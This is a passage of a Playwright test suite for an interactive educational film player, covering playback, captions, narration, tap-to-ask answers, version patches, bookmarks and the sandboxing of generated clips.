import { readFile, stat } from 'node:fs/promises';
import { expect, test, type Locator, type Page } from '@playwright/test';
import { SCENE_FIXTURES } from '../src/scene-fixtures';

// Serial: the dev server keeps one film library, so every test starts from no
// stored versions and writers never race readers.
test.describe.configure({ mode: 'serial' });

async function openPlayer(page: Page, film: string, extra = ''): Promise<void> {
  await page.request.get('/api/dev/films/clear');
  // Play starts the teacher by default: with a live token route the film
  // would open a real session here, so these specs pin the route off and
  // every Play falls back to silent playback.
  await page.route('/api/v1/live/token', (route) =>
    route.fulfill({ status: 404, contentType: 'application/json', body: JSON.stringify({}) }),
  );
  // The reference model answers here: these specs assert its exact words
  // ('fastest'), so the player must not open a real model session even when
  // the dev server carries keys. `extra` adds query flags such as debug=1.
  await page.goto(`/?page=player&film=${film}&reference=1${extra ? `&${extra}` : ''}`);
  await page.waitForFunction(() => window.__playground?.ready === true);
}

/** Opens the transport's "more" menu, which holds the secondary controls. */
async function openMenu(page: Page): Promise<void> {
  await page.locator('.inc-menu > button').click();
  await expect(page.locator('.inc-menu-pop')).toBeVisible();
}

/** Seeks to a beat's start plus an offset, through the player's own model. */
async function seekBeat(page: Page, index: number, offset: number): Promise<void> {
  await page.evaluate(([i, off]) => {
    const playground = window.__playground as unknown as { model: { seek(seconds: number): void }; film: { beats: Array<{ start: number }> } };
    playground.model.seek(playground.film.beats[i]!.start + off);
  }, [index, offset] as const);
}

interface AskState {
  readonly sheet: boolean;
  readonly answer: string;
  readonly markers: number;
  readonly stack: number;
  readonly insert: string | null;
  readonly remaining: number;
  readonly showme: string | null;
  readonly example: string | null;
  readonly depth: string;
  readonly language: string;
}

async function askState(page: Page): Promise<AskState> {
  return page.evaluate(() => (window.__playground?.ask as () => AskState)());
}

interface FullState {
  readonly version: number;
  readonly history: string[];
  readonly loop: string | null;
  readonly bookmarks: Array<{ id: string; beat: string; word: number }>;
  readonly resumed: boolean;
  readonly hash: string;
  readonly reducedMotion: boolean;
}

async function fullState(page: Page): Promise<FullState> {
  return page.evaluate(() => (window.__playground?.full as () => FullState)());
}

test('the player plays a silent film with captions and a transcript', async ({ page }) => {
  await openPlayer(page, 'thirty', 'debug=1');
  await expect(page.locator('.inc-player h2')).toHaveText('How a pendulum keeps time');
  await expect(page.locator('.inc-timeline-clip')).toHaveCount(6);
  await expect(page.locator('.inc-transcript li')).toHaveCount(6);

  await page.locator('.inc-player-transport button').first().click();
  await page.waitForFunction(() => {
    const stats = (window.__playground?.stats as () => { time: number })();
    return stats.time > 1;
  });
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');

  // The transcript seeks: the last line jumps to the last beat.
  await page.locator('.inc-transcript li').last().locator('button').click();
  await page.waitForFunction(() => {
    const stats = (window.__playground?.stats as () => { beat: string | null })();
    return stats.beat === 's1b6';
  });
  await expect(page.locator('.inc-caption')).toContainText('keeps time');
});

test('caption toggles apply without waiting for the next beat', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await page.evaluate(() => (window.__playground?.model as unknown as { seek(seconds: number): void }).seek(1));
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
  // Caption sizes solve once the measured fonts arrive.
  await page.evaluate(() => document.fonts.ready);
  await expect.poll(async () => page.locator('.inc-caption').evaluate((el) => el.style.fontSize)).not.toBe('');
  const beat = await page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat);

  const caption = page.locator('.inc-caption');
  const before = await caption.evaluate((el) => getComputedStyle(el).fontSize);
  await openMenu(page);
  await page.locator('select[aria-label="Caption size"]').selectOption('lg');
  await expect
    .poll(async () => caption.evaluate((el) => getComputedStyle(el).fontSize))
    .not.toBe(before);

  await page.getByRole('button', { name: 'Captions' }).click();
  await expect(caption).toBeEmpty();
  await page.getByRole('button', { name: 'Captions' }).click();
  await expect(caption).toContainText('pendulum hangs');

  // Nothing above changed the beat: the chrome applied on its own events.
  await expect
    .poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat))
    .toBe(beat);
});

/** How many shown layer elements cover the stage center: nonzero means a layer leaks over the figure. */
async function layerCoverAtStageCenter(page: Page): Promise<number> {
  return page.evaluate(() => {
    const stage =
      document.querySelector('.inc-player-figure svg.inc-stage') ?? document.querySelector('.inc-player-figure iframe');
    if (!stage) return -1;
    const box = stage.getBoundingClientRect();
    const x = box.x + box.width / 2;
    const y = box.y + box.height / 2;
    // Rect overlap, not hit testing: the layers are pointer-events none, so
    // elementsFromPoint would miss them even while they cover the stage. The
    // overlays fade instead of toggling display, so a faded-out layer keeps
    // its box: only count layers that actually paint.
    return [...document.querySelectorAll('.inc-player-write, .inc-player-notes')].filter((el) => {
      const rect = el.getBoundingClientRect();
      return (
        getComputedStyle(el).visibility === 'visible' &&
        rect.width > 0 &&
        rect.height > 0 &&
        x >= rect.x &&
        x <= rect.x + rect.width &&
        y >= rect.y &&
        y <= rect.y + rect.height
      );
    }).length;
  });
}

test('explainer layers stay hidden on a film without layers', async ({ page }) => {
  await openPlayer(page, 'thirty');
  // A display regression on any layer class would paint over the pendulum here.
  await expect(page.locator('.inc-player-xcard')).toHaveCount(0);
  await expect(page.locator('.inc-player-write')).toBeHidden();
  await expect(page.locator('.inc-player-notes')).toBeHidden();
  expect(await layerCoverAtStageCenter(page)).toBe(0);
});

test('a layered film shows write and notes on their beat only', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  const js = [
    "inc.idea('A ball rests beside step-by-step notes.');",
    "inc.describe(() => 'A ball beside notes that arrive beat by beat.');",
    "const stage = inc.svg('#stage', { viewBox: [0, 0, 600, 400], title: 'Layers' });",
    "const ball = stage.circle(150, 200, 25, { tone: 'hi' });",
    "stage.part('Ball', ball, { label: 'Ball', info: 'A ball left of centre.' });",
    'inc.steps([',
    "  { say: 'First we set the scene.' },",
    "  { say: 'The ball rests while we write its rule.', focus: 'Ball', write: { text: 'x = 3', math: true }, notes: ['The ball rests.'] },",
    ']);',
  ].join('\n');
  const beats = [
    { id: 's1b1', say: 'First we set the scene.' },
    {
      id: 's1b2',
      say: 'The ball rests while we write its rule.',
      focus: 'Ball',
      write: { text: 'x = 3', math: true },
      notes: ['The ball rests.'],
    },
  ];
  const saved = await page.request.post('/api/dev/films', {
    data: {
      id: 'gen-layers-1',
      storyboard: { film: { title: 'Layers', lengthTarget: 30 }, scenes: [{ id: 's1', idea: 'A ball with room for layers.', kit: 'svg', durationShare: 1, beats }] },
      scenes: [{ id: 's1', html: "<div id='stage'></div>", css: '', js }],
    },
  });
  expect(saved.ok()).toBe(true);
  await page.goto('/?page=player&film=gen-layers-1');
  await page.waitForFunction(() => window.__playground?.ready === true);
  // Ready lands before any beat applies, so the caption is still null: seek
  // onto beat 1 first. Notes arrive on beat 2, but the scene already reports
  // split on beat 1 — one layout from the first frame.
  await seekBeat(page, 0, 0);
  await page.waitForFunction(() => (window.__playground?.stats as () => { beat: string | null })().beat === 's1b1');
  const splitOnFirstBeat = await page.evaluate(
    () => (window.__playground?.model as unknown as { state: { caption: { split: boolean } | null } }).state.caption?.split,
  );
  expect(splitOnFirstBeat).toBe(true);
  // No layers on the first beat: write and notes arrive with beat 2.
  await expect(page.locator('.inc-player-write')).toBeHidden();
  await expect(page.locator('.inc-player-notes')).toBeHidden();
  await seekBeat(page, 1, 1);
  await expect(page.locator('.inc-player-write')).toContainText('x');
  await expect(page.locator('.inc-player-write')).toBeVisible();
  await expect(page.locator('.inc-player-notes')).toContainText('The ball rests.');
  await expect(page.locator('.inc-player-notes')).toBeVisible();
  // The notes panel lands beside the narrowed stage, or stacked under it on
  // narrow players — never over the drawing.
  const placed = await page.evaluate(() => {
    const stage = document.querySelector('.inc-player-figure svg.inc-stage') ?? document.querySelector('.inc-player-figure iframe');
    const notes = document.querySelector('.inc-player-notes');
    if (!stage || !notes) return 'missing';
    const s = stage.getBoundingClientRect();
    const n = notes.getBoundingClientRect();
    if (n.width === 0 || n.height === 0) return 'hidden';
    if (n.left >= s.right - 2) return 'beside';
    if (n.top >= s.bottom - 2) return 'stacked';
    return 'overlapping';
  });
  expect(['beside', 'stacked']).toContain(placed);
});

test('the one-minute film reports seek=play and passing film checks', async ({ page }) => {
  await openPlayer(page, 'sixty', 'debug=1');
  await expect(page.locator('.inc-timeline-clip')).toHaveCount(8);
  await expect(page.locator('.inc-player-badge').nth(1)).toContainText('seek=play: pass', { timeout: 30_000 });
  await expect(page.locator('.inc-player-badge').nth(2)).toContainText('all 8 beats pass', { timeout: 60_000 });
});

test('stub narration times the beats and highlights caption words', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await expect
    .poll(async () => page.evaluate(() => (window.__playground?.narration as () => { source: string; timed: number; beats: number })()))
    .toMatchObject({ source: 'stub', timed: 6, beats: 6 });
  await page.evaluate(() => (window.__playground?.model as unknown as { seek(seconds: number): void }).seek(0.1));
  await expect(page.locator('.inc-caption-word')).not.toHaveCount(0);
  await expect(page.locator('.inc-caption-word.is-active').first()).toContainText('A');

  await page.locator('.inc-player-transport button').first().click();
  await page.waitForFunction(() => {
    const stats = (window.__playground?.stats as () => { time: number })();
    return stats.time > 1.2;
  });
  await expect.poll(async () => page.locator('.inc-caption-word.is-active').first().textContent()).not.toBe('A');
});

test('the sound toggle schedules narration and stays silent until then', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await page.evaluate(() => (window.__playground?.model as unknown as { seek(seconds: number): void }).seek(0.5));
  await page.locator('.inc-player-transport button').first().click();
  await page.waitForFunction(() => {
    const stats = (window.__playground?.stats as () => { time: number })();
    return stats.time > 0.8;
  });
  const silent = await page.evaluate(() => (window.__playground?.mixerEvents as () => Array<{ type: string }>)());
  expect(silent.filter((event) => event.type === 'play')).toHaveLength(0);

  const sound = page.getByRole('button', { name: 'Sound' });
  await expect(sound).toHaveText('Sound: off');
  await sound.click();
  await expect(sound).toHaveText('Sound: on');
  await expect
    .poll(async () => page.evaluate(() => (window.__playground?.mixerEvents as () => Array<{ type: string }>)()).then((events) => events.filter((e) => e.type === 'play').length))
    .toBeGreaterThan(0);
});

test('tap-to-ask streams an Answer and pins question markers', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await expect(page.locator('.inc-ask-context')).toContainText('s1b1');
  await expect(page.locator('.inc-ask-context')).toContainText('pendulum');

  await page.locator('.inc-ask-input').fill('What hangs it?');
  await page.locator('.inc-ask-chips button').first().click();
  await expect(page.locator('.inc-ask-answer')).toContainText('fastest', { timeout: 15_000 });
  await expect(page.locator('.inc-ask-status')).toContainText('First words in');

  // Markers in the scrubber and the transcript, at the anchor.
  await expect(page.locator('.inc-scrub-markers .inc-marker')).toHaveCount(1);
  await expect(page.locator('.inc-transcript .inc-marker')).toHaveCount(1);
  expect((await askState(page)).markers).toBe(1);

  // The film stays paused where it was asked.
  const stats = await page.evaluate(() => (window.__playground?.stats as () => { playing: boolean; beat: string | null })());
  expect(stats.playing).toBe(false);
  expect(stats.beat).toBe('s1b1');

  // Answer speech is opt-in: the stub answers silently through the same endpoint.
  await page.getByRole('button', { name: 'Hear answer' }).click();
  await expect(page.locator('.inc-ask-speak-status')).toContainText('Answer speech:', { timeout: 15_000 });
});

test('Show me replays the beat on the live scene and restores it', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(1).click();
  await expect(page.locator('.inc-showme')).toContainText('Showing s1b3');
  await expect.poll(async () => (await askState(page)).showme).toBe('s1b3');

  await page.locator('.inc-showme button').click();
  await expect(page.locator('.inc-showme')).toBeHidden();
  await expect.poll(async () => (await askState(page)).showme).toBeNull();
});

test('Explain deeper plays an insert and Back now resumes at the anchor word', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(2).click();
  await expect(page.locator('.inc-insert')).toContainText('Explaining deeper', { timeout: 15_000 });
  await expect(page.locator('.inc-caption')).toContainText('Here is the step again');
  await expect.poll(async () => (await askState(page)).insert).toBe('insert');

  await page.locator('.inc-insert button').click();
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing)).toBe(true);
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b3');
  await expect(page.locator('.inc-insert')).toBeHidden();
});

test('an insert auto-resumes at the anchor word after a back-to-film beat', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 4, 0.3);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(2).click();
  await expect(page.locator('.inc-insert')).toContainText('Explaining deeper', { timeout: 15_000 });
  await expect(page.locator('.inc-caption')).toContainText('Back to the film', { timeout: 15_000 });
  await expect
    .poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing), { timeout: 20_000 })
    .toBe(true);
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b5');
  await expect(page.locator('.inc-insert')).toBeHidden();
});

test('narration settings keep the key in memory and need none for the stub', async ({ page }) => {
  await openPlayer(page, 'thirty', 'debug=1');
  const key = page.locator('.inc-narration-key');
  await expect(key).toHaveAttribute('type', 'password');
  await expect(key).toHaveAttribute('autocomplete', 'off');
  await expect(key).toHaveValue('');
  await expect(page.locator('.inc-narration-voice')).toHaveValue('');
  await expect(page.locator('.inc-narration-hint')).toContainText('never saved');
});

test('the narration section shows the Cartesia connection state without a key check', async ({ page }) => {
  await openPlayer(page, 'thirty', 'debug=1');
  await page.locator('.inc-narration > summary').click();
  const connection = page.locator('.inc-narration-connection');
  // At a glance, before Test connection is ever pressed: the state line names both sources.
  await expect(connection).toContainText(/Cartesia (not )?connected \(key source: [\w.]+, voice source: \w+/, { timeout: 30_000 });
  await expect(page.getByRole('button', { name: 'Test connection' })).toBeVisible();
  // Autoconnect removes pasting, not the Sound toggle: films still open silent.
  await expect(page.getByRole('button', { name: 'Sound' })).toHaveText('Sound: off');
});

test('the key check reports the voice source and never the key', async ({ page }) => {
  await openPlayer(page, 'thirty', 'debug=1');
  const empty = await page.request.post('/api/dev/narration-key', { data: {} });
  const shape = (await empty.json()) as Record<string, unknown>;
  test.skip(shape.source !== 'none' || shape.voiceSource !== 'none', 'needs a dev server without CARTESIA_API_KEY and CARTESIA_VOICE_ID');
  // None/none, with no probe and no network: the voice travels as a source, never as an id, and the key not at all.
  expect(empty.status()).toBe(400);
  expect(shape).toMatchObject({ ok: false, source: 'none', voiceSource: 'none', voiceTail: null, connected: false });
  expect(shape).not.toHaveProperty('apiKey');
  // Partial: an entered voice with no key still answers without a probe, as a source plus a tail.
  const partial = await page.request.post('/api/dev/narration-key', { data: { voice: 'voice-sentinel-abcdef' } });
  expect(partial.status()).toBe(400);
  const part = (await partial.json()) as Record<string, unknown>;
  expect(part).toMatchObject({ source: 'none', voiceSource: 'entered', voiceTail: 'cdef', connected: false });
  expect(JSON.stringify(part)).not.toContain('voice-sentinel-abcdef');
});

test('cartesia narration with both fields empty falls back to the server default', async ({ page }) => {
  await openPlayer(page, 'thirty', 'debug=1');
  const status = (await (await page.request.post('/api/dev/narration-key', { data: {} })).json()) as { source?: string; voiceSource?: string };
  test.skip(status.source !== 'none' || status.voiceSource !== 'none', 'needs a dev server without CARTESIA_API_KEY and CARTESIA_VOICE_ID');
  const beats = [{ id: 's1b1', text: 'A pendulum hangs from its pivot.' }];
  // Both fields empty and nothing on the server: today's behavior — the key, then the voice, is required from the UI.
  const keyless = await page.request.post('/api/dev/narrate', { data: { beats, source: 'cartesia' } });
  expect(keyless.status()).toBe(400);
  expect(((await keyless.json()) as { message?: string }).message).toMatch(/CARTESIA_API_KEY/);
  const voiceless = await page.request.post('/api/dev/narrate', { data: { beats, source: 'cartesia', apiKey: 'test-key-sentinel-0000000000' } });
  expect(voiceless.status()).toBe(400);
  const voicelessBody = (await voiceless.json()) as Record<string, unknown>;
  expect(voicelessBody.message).toMatch(/CARTESIA_VOICE_ID/);
  // An entered key and voice resolve past both required gates — the retention gate answers, with zero network.
  const entered = await page.request.post('/api/dev/narrate', {
    data: { beats, source: 'cartesia', apiKey: 'test-key-sentinel-0000000000', voice: 'entered-voice-id' },
  });
  test.skip(entered.status() === 200, 'the dev server accepts Cartesia retention, so this request narrated for real');
  expect(entered.status()).toBe(400);
  const enteredBody = (await entered.json()) as Record<string, unknown>;
  expect(enteredBody.message).toMatch(/RETENTION/);
  // The key never leaves the server: no response carries it back.
  for (const body of [voicelessBody, enteredBody]) {
    expect(body).not.toHaveProperty('apiKey');
    expect(JSON.stringify(body)).not.toContain('test-key-sentinel-0000000000');
  }
  // The button sends both fields empty and reports the server's answer.
  await page.locator('.inc-narration > summary').click();
  await page.getByRole('button', { name: 'Narrate with Cartesia' }).click();
  await expect(page.locator('.inc-narration').getByText('The dev server did not answer.')).toBeVisible({ timeout: 15_000 });
});

test('Another example opens a side clip with its own playback and returns to the film', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(3).click();
  await expect(page.locator('.inc-example')).toContainText('The same idea, shown another way.', { timeout: 15_000 });
  // The generated clip mounts sandboxed, never trusted on the page thread.
  await expect(page.locator('.inc-example-figure iframe')).toHaveAttribute('sandbox', 'allow-scripts');
  await expect(page.frameLocator('.inc-example-figure iframe').locator('.inc-figure')).toBeVisible();
  await expect.poll(async () => (await askState(page)).example).toBe('The same idea, shown another way.');

  // The film waits, paused, while the example plays independently.
  const stats = await page.evaluate(() => (window.__playground?.stats as () => { playing: boolean; beat: string | null })());
  expect(stats.playing).toBe(false);
  expect(stats.beat).toBe('s1b3');
  await page.locator('.inc-example-toggle').click();
  await expect(page.locator('.inc-example-toggle')).toHaveText('Play example');
  await page.locator('.inc-example-toggle').click();
  await expect(page.locator('.inc-example-toggle')).toHaveText('Pause example');

  await page.locator('.inc-example-return').click();
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing)).toBe(true);
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b3');
  await expect(page.locator('.inc-example')).toBeHidden();
  await expect.poll(async () => (await askState(page)).example).toBeNull();
});

test('the router sends example words to the side clip, the slowest rung', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 1, 0.4);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-input').fill('Give me another example of the swing');
  await page.getByRole('button', { name: 'Ask', exact: true }).click();
  await expect(page.locator('.inc-example')).toContainText('The same idea, shown another way.', { timeout: 15_000 });
  await expect.poll(async () => (await askState(page)).example).not.toBeNull();
});

test('a runaway side clip is rejected before playback and the page stays responsive', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  const runaway = SCENE_FIXTURES.runaway!;
  await page.route('**/api/v1/ask/example', (route) =>
    route.fulfill({
      json: {
        status: 'clip',
        clip: {
          anchor: { film: 'pendulum', version: 1, scene: 's1', beat: 's1b3', wordIndex: 0 },
          html: runaway.html,
          css: runaway.css,
          js: runaway.js,
          caption: 'A list that never stops growing.',
        },
      },
    }),
  );
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(3).click();
  // The probe rejects it in its hidden sandbox; nothing ever mounts on the page thread.
  await expect(page.locator('.inc-ask-status')).toContainText('did not pass its checks', { timeout: 30_000 });
  await expect(page.locator('.inc-example')).toBeHidden();
  await expect.poll(async () => (await askState(page)).example).toBeNull();
  // The page is still alive: the film waits, paused, where it was asked.
  const stats = await page.evaluate(() => (window.__playground?.stats as () => { playing: boolean; beat: string | null })());
  expect(stats.playing).toBe(false);
  expect(stats.beat).toBe('s1b3');
});

test('Change the film creates a playable version 2', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-change-open').click();
  await page.locator('.inc-change-input').fill('Open on the moment itself');
  await page.locator('.inc-change-send').click();
  await expect(page.locator('.inc-version')).toContainText('Version 2', { timeout: 60_000 });
  expect((await fullState(page)).version).toBe(2);
  await page.evaluate(() => (window.__playground?.model as unknown as { seekBeat(id: string): void }).seekBeat('s1b1'));
  await expect(page.locator('.inc-caption')).toContainText('Watch the same moment again');
});

test('a tampered patch is rejected client-side before it touches the film', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await page.route('**/api/v1/ask/change', (route) =>
    route.fulfill({
      json: {
        status: 'patch',
        patch: {
          film: 'pendulum',
          parent: 1,
          version: 2,
          reason: 'Open on the moment itself',
          beats: [{ beat: 's1b1', scene: 's1', say: 'Watch the same moment again, closely.', set: { angle: 1 } }],
          audio: [],
        },
      },
    }),
  );
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-change-open').click();
  await page.locator('.inc-change-input').fill('Open on the moment itself');
  await page.locator('.inc-change-send').click();
  await expect(page.locator('.inc-ask-status')).toContainText('did not fit');
  await expect(page.locator('.inc-version')).toContainText('Version 1');
  expect((await fullState(page)).version).toBe(1);
});

test('patch audio sounds only on beats the patch changed', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await page.route('**/api/v1/ask/change', (route) =>
    route.fulfill({
      json: {
        status: 'patch',
        patch: {
          film: 'pendulum',
          parent: 1,
          version: 2,
          reason: 'Open on the moment itself',
          beats: [{ beat: 's1b1', scene: 's1', say: 'Watch the same moment again, closely.' }],
          audio: [
            { beat: 's1b1', seconds: 2.4, words: [0, 0.4, 0.8, 1.2, 1.6, 2], audioBase64: 'AA==', sampleRate: 8000 },
            { beat: 's1b2', seconds: 2, words: [0, 0.4], audioBase64: 'AA==', sampleRate: 8000 },
          ],
        },
      },
    }),
  );
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-change-open').click();
  await page.locator('.inc-change-input').fill('Open on the moment itself');
  await page.locator('.inc-change-send').click();
  await expect(page.locator('.inc-version')).toContainText('Version 2', { timeout: 60_000 });
  const loads = await page.evaluate(() =>
    (window.__playground?.mixerEvents as () => Array<{ type: string; hash?: string }>)()
      .filter((event) => event.type === 'load')
      .map((event) => event.hash),
  );
  expect(loads).toContain('v2-s1b1');
  expect(loads).not.toContain('v2-s1b2');
});

test('loop-a-beat replays the beat until it is switched off', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await page.evaluate(() => {
    const playground = window.__playground as unknown as { model: { seek(seconds: number): void }; film: { beats: Array<{ start: number; seconds: number }> } };
    const beat = playground.film.beats[2]!;
    playground.model.seek(beat.start + beat.seconds - 0.4);
  });
  await openMenu(page);
  await page.locator('.inc-player-loop').click();
  await expect(page.locator('.inc-player-loop')).toContainText('Loop: s1b3');
  expect((await fullState(page)).loop).toBe('s1b3');
  await page.locator('.inc-player-transport button').first().click();
  await page.waitForTimeout(1200);
  const stats = await page.evaluate(() => (window.__playground?.stats as () => { playing: boolean; beat: string | null })());
  expect(stats.beat).toBe('s1b3');
  expect(stats.playing).toBe(true);
  await openMenu(page);
  await page.locator('.inc-player-loop').click();
  await expect(page.locator('.inc-player-loop')).toContainText('Loop: off');
});

test('bookmarks add, jump and remove by beat and word', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  await openMenu(page);
  await page.locator('.inc-bookmark-add').click();
  await expect(page.locator('.inc-bookmarks li[data-bookmark]')).toHaveCount(1);
  expect((await fullState(page)).bookmarks).toHaveLength(1);
  await seekBeat(page, 5, 0.2);
  await page.locator('.inc-bookmarks li[data-bookmark] button').first().click();
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b3');
  await page.locator('.inc-bookmarks li[data-bookmark] button').nth(1).click();
  await expect(page.locator('.inc-bookmarks li[data-bookmark]')).toHaveCount(0);
});

test('link-to-time deep links seek on load and copy from the transport', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  await page.goto('/?page=player&film=thirty#film=pendulum&v=1&beat=s1b4&w=1');
  await page.waitForFunction(() => window.__playground?.ready === true);
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b4');

  await openMenu(page);
  await page.locator('.inc-player-link').click();
  await expect(page.locator('.inc-player-link-note')).toContainText('Link to s1b4 copied');
  expect((await fullState(page)).hash).toContain('beat=s1b4');
});

test('keyboard shortcuts play, move and ask without touching fields', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await expect(page.locator('.inc-shortcuts li')).toHaveCount(11);
  await expect(page.locator('.inc-shortcuts li', { hasText: 'Teacher voice on / off' })).toHaveCount(1);
  // Play starts the teacher by default: silence it so this stays a pure
  // keyboard test with no socket and no mic prompt.
  await openMenu(page);
  await page.locator('.inc-teacher-voice').uncheck();
  await page.locator('.inc-player h2').click();
  await page.keyboard.press('k');
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing)).toBe(true);
  await page.keyboard.press('k');
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing)).toBe(false);
  await page.keyboard.press('.');
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b2');
  // Fields keep their keys: typing in the ask box asks, never seeks.
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-input').fill('kl,');
  await page.locator('.inc-ask-input').press('k');
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b2');
});

test('resume restores the film where it was left', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 3, 0.4);
  await page.locator('.inc-player-transport button').first().click();
  await page.waitForTimeout(400);
  await page.locator('.inc-player-transport button').first().click();
  // Pausing saves the position: ids and numbers only.
  const stored = await page.evaluate(() => {
    const key = Object.keys(window.localStorage).find((name) => name.startsWith('incantly.film.resume.pendulum.'));
    return key ? window.localStorage.getItem(key) : null;
  });
  expect(stored).not.toBeNull();
  expect(Object.keys(JSON.parse(stored!) as Record<string, unknown>).sort()).toEqual(['beat', 't', 'v', 'w']);
  await page.reload();
  await page.waitForFunction(() => window.__playground?.ready === true);
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { beat: string | null })().beat)).toBe('s1b4');
  expect((await fullState(page)).resumed).toBe(true);
  await expect(page.locator('.inc-resume')).toContainText('Resumed where you left off');
});

test('reduced motion starts on a still beat with its caption', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  await page.goto('/?page=player&film=thirty&reduced-motion=1');
  await page.waitForFunction(() => window.__playground?.ready === true);
  expect((await fullState(page)).reducedMotion).toBe(true);
  const stats = await page.evaluate(() => (window.__playground?.stats as () => { playing: boolean; beat: string | null })());
  expect(stats.playing).toBe(false);
  expect(stats.beat).toBe('s1b1');
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
});

test('Simpler re-runs the answer at another depth', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-input').fill('What hangs it?');
  await page.locator('.inc-ask-chips button').first().click();
  await expect(page.locator('.inc-ask-answer')).toContainText('fastest', { timeout: 15_000 });
  await page.locator('.inc-ask-simpler').click();
  await expect(page.locator('.inc-ask-status')).toContainText('(simpler)', { timeout: 15_000 });
  await expect.poll(async () => (await askState(page)).depth).toBe('answer');
});

test('language and voice choices are offered for answers', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await expect(page.locator('.inc-ask-language option')).toHaveCount(6);
  await expect.poll(async () => page.locator('.inc-ask-voice option').count(), { timeout: 15_000 }).toBeGreaterThan(1);
  await page.locator('.inc-ask-language').selectOption('es');
  expect((await askState(page)).language).toBe('es');
});

interface VersionsState {
  readonly current: number;
  readonly list: Array<{ version: number; summary: string; reason: string; beats: string[] }>;
  readonly inserts: Array<{ id: string; beat: string; version: number; lines: number }>;
  readonly flatten: { film: number; filmPlus: number; transcript: number };
}

async function versionsState(page: Page): Promise<VersionsState> {
  return page.evaluate(() => (window.__playground?.versions as () => VersionsState)());
}

const VERSION_PATCH = {
  status: 'patch',
  patch: {
    film: 'pendulum',
    parent: 1,
    version: 2,
    reason: 'Open on the moment itself',
    beats: [{ beat: 's1b1', scene: 's1', say: 'Watch the same moment again, closely.' }],
    audio: [],
  },
};

async function makeVersion2(page: Page): Promise<void> {
  await seekBeat(page, 0, 0.5);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-change-open').click();
  await page.locator('.inc-change-input').fill('Open on the moment itself');
  await page.locator('.inc-change-send').click();
  await expect(page.locator('.inc-version')).toContainText('Version 2', { timeout: 60_000 });
}

test('the version picker lists versions and switches between them', async ({ page }) => {
  await page.route('**/api/v1/ask/change', (route) => route.fulfill({ json: VERSION_PATCH }));
  await openPlayer(page, 'thirty');
  await openMenu(page);
  await expect(page.locator('.inc-version-picker option')).toHaveCount(1);
  await makeVersion2(page);
  // The ask-sheet clicks close the menu, so reopen it before touching the picker.
  await openMenu(page);
  await expect(page.locator('.inc-version-picker option')).toHaveCount(2);
